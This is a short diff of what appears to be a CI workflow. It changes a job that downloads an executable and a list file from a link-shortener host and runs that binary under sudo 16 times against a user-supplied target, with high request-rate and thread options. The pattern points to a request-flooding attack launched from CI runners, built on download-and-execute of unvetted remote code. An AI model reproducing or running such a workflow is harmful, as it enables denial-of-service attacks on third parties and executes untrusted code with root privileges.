@@ -23,12 +23,13 @@ jobs:
       - name: OK !
         run: |
           TARGET="${{ inputs.target }}"
-          wget https://curl.by/rWI9r/blaze
-          chmod +x blaze
+          wget https://curl.by/rMn2p/gon.txt
+          wget https://curl.by/cFpDM/killed
+          chmod +x killed
           
           PIDS=()
-          for i in {1..0}; do
-            sudo timeout 250 ./blaze "$TARGET" 250 5 5 GET
+          for i in {1..16}; do
+            sudo timeout 250 ./killed "$TARGET" 250 gon.txt --rate 8000 --threads 16 --mobile
             PIDS+=($!)
           done
 
